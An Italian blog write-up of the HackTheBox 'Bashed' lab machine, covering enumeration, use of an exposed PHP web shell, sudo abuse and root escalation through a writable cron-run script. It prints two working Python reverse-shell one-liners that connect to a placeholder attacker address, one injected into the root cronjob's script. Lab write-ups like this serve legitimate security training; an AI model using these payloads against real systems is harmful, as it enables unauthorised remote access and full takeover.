+++
date = '2026-05-19T20:22:37+02:00'
draft = false
title = 'Bashed Writeup IT'
+++
**Nome:** **`joy.scd01`**

**Data:** **`20/01/2025`**

![Bashed.png](/images/imgs_bashed/Bashed.png)

---
# Introduzione

**_Bashed_** è una macchina **Linux di livello Easy** basata su un'applicazione web vulnerabile.

La particolarità di questo box è la presenza di una **web shell accessibile pubblicamente**, che permette l'esecuzione di comandi e rende **l'accesso iniziale** molto semplice.

Dopo aver effettuato un **Movimento Laterale** verso un altro utente, la **Privilege Escalation** viene ottenuta abusando di un **cronjob mal configurato**.

---
# Tecniche Utilizzate

- **Web Shell Pubblica -> RCE**
- **Abuso di permessi sudo**
- **Escalation tramite cronjob mal configurato**

---
# Enumerazione

## Nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- bashed
```

![nmap1.png](/images/imgs_bashed/nmap1.png)

Scansione mirata con script e servizi:

```bash
nmap -sC -sV bashed
```

![nmap2.png](/images/imgs_bashed/nmap2.png)

**Porte aperte**:

**80/tcp** – HTTP (Apache)

---
## gobuster

Ho quindi effettuato una scansione delle directory con **Gobuster**:

```bash
gobuster dir -u bashed -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
```

![gobuster.png](/images/imgs_bashed/gobuster.png)

Tra le risorse trovate, nella directory **`/dev`** è presente un file molto interessante: **`phpbash.php`**

![phpbash.png](/images/imgs_bashed/phpbash.png)

Aprendolo, si ottiene una **web shell** come utente `www-data`.

---
# Foothold 

Per ottenere una shell migliore:

1. Ho avviato un `netcat` listener:

```bash
nc -lnvp 22667
```

2. Ho eseguito il comando di una Reverse Shell in Python tramite la web shell:

```bash
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("<attacker_IP>",<lport>));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

3. Shell ottenuta e stabilizzata:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![shell.png](/images/imgs_bashed/shell.png)

In **`/home/arrexel`**, ho trovato la **user flag**.

![users.png](/images/imgs_bashed/users.png)

---
# Privilege Escalation

Per continuare, ho controllato i permessi sudo:

```bash
sudo -l
```

![sudo_l.png](/images/imgs_bashed/sudo_l.png)

L’utente corrente può eseguire **qualsiasi comando come `scriptmanager` senza password**.

Quindi ho effettuato un _lateral movement_:

```bash
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![user2.png](/images/imgs_bashed/user2.png)

**Nota**: Avrei potuto usare anche: `sudo -u scriptmanager /bin/bash`

# pspy

A questo punto ho trasferito **pspy** per monitorare i processi:

1. Attaccante:

```bash
nc bashed 22667 < pspy64
```

2. Vittima:

```bash
nc -lvnp 22667 > pspy64
```

L'ho reso eseguibile e l'ho avviato:

![pspy.png](/images/imgs_bashed/pspy.png)

Dopo un po' è emerso qualcosa di interessante:

![cron.png](/images/imgs_bashed/cron.png)

Un **cronjob eseguito da root** che esegue periodicamente `test.py`, un file scrivibile da **scriptmanager**.

A questo punto la Privilege Escalation era chiara.

1. Ho modificato il contenuto di `test.py` con il codice di una **Reverse Shell** in **Python**:

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker_ip>',<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);" > test.py
```

2. Mi sono messo in ascolto, e dopo pochi secondi ho ottenuto una **shell da root**.

![root.png](/images/imgs_bashed/root.png)

---
# Conclusioni Finali

Bashed è la primissima macchina mai creata su HackTheBox: classica e lineare, dove tutto si incastra alla perfezione non appena si nota la web shell esposta.

Anche la privilege escalation non presenta particolari insidie: il percorso è pulito, prevedibile e semplice da seguire.

Nel complesso, questa macchina rappresenta un **ottimo primo passo nel mondo del pentesting**, perfetta per chi sta iniziando e vuole familiarizzare con concetti fondamentali come **enumerazione web**, **permessi sudo** e **cronjob mal configurati**.
